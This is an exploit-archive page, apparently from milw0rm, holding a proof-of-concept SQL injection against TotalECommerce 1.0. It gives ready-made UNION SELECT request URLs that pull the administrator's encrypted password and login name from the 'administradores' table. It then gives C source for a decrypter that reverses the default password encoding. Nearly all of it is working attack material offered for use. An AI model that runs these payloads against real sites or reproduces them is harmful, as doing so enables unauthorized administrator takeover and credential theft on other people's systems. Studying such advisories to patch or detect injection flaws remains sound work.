<html><head><title>TotalECommerce <= 1.0 (index.asp id) Remote SQL Injection Exploit</title></head><pre>Original advisory: http://www.nukedx.com/?viewdoc=18
Advisory by: nukedx
Full PoC
Explotation:
GET -&gt; http://[victim]/[dir]/index.asp?secao=[PageID]&amp;id=[SQL]
EXAMPLE 1 -&gt; http://[victim]/[dir]/index.asp?secao=25&amp;id=-1+UNION+select+senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha+from+administradores
EXAMPLE 2 -&gt; http://[victim]/[dir]/index.asp?secao=25&amp;id=-1+UNION+select+login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login+from+administradores
with example 1 remote attacker can get admin's encrypted password and with example 2 remote attacker can get admin's login name
[PageID]: must be working page id you can get some from frontpage.
&lt;--Decrypter code--&gt;
&lt;--Note: This decrypter just decrypts default data
If webmaster changed te_chave value in funcoes.asp
this decrypter wont decrypt data so you need to 
make your own decrypter
--&gt;
&lt;--C Source--&gt;
/*********************************************
*        TotalECommerce PWD Decrypter        *
*        Coded by |SaMaN| for nukedx         *
*          http://www.k9world.org            *
*              IRC.K9World.Org               *
*Advisory: http://www.nukedx.com/?viewdoc=18 *
**********************************************/
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;ctype.h&gt;

int main()
{
  char buf[255];
  char buf2[255];
  char buf3[255];
  char *texto;
  char *vcrypt;   
  int i,x,z,t = 0;
  char saman;
  texto = buf;
  vcrypt = buf2;
  printf(&quot;%s&quot;, &quot;|=------------------------------------=|\n&quot;);
  printf(&quot;%s&quot;, &quot;   Coded by |SaMaN| @ IRC.K9World.Org\n&quot;);
  printf(&quot;%s&quot;, &quot;|=------------------------------------=|\n\n&quot;);
  printf(&quot;%s&quot;, &quot;Enter crypted password: &quot;);
  scanf(&quot;%200s&quot;, buf);
  if (!texto)
  vcrypt = &quot;&quot;;

  for (i = 0; i &lt; strlen(texto); i++)
  {
    if ((vcrypt == &quot;&quot;) || (i &gt; strlen(texto)))
    x = 1;
    else 
    x = x + 1;
    t = buf[i];
    z = 255 - t;
    saman = toascii(z);
    snprintf(buf3, 250, &quot;%c&quot;, saman);
    strncat(buf2, buf3, 250);
  }
  printf(&quot;Result: %s\n&quot;, buf2);
  return;
}
&lt;--End of code--&gt;
&lt;--Thanks |SaMaN| for decrypter--&gt;

// milw0rm.com [2006-03-04]</pre></html>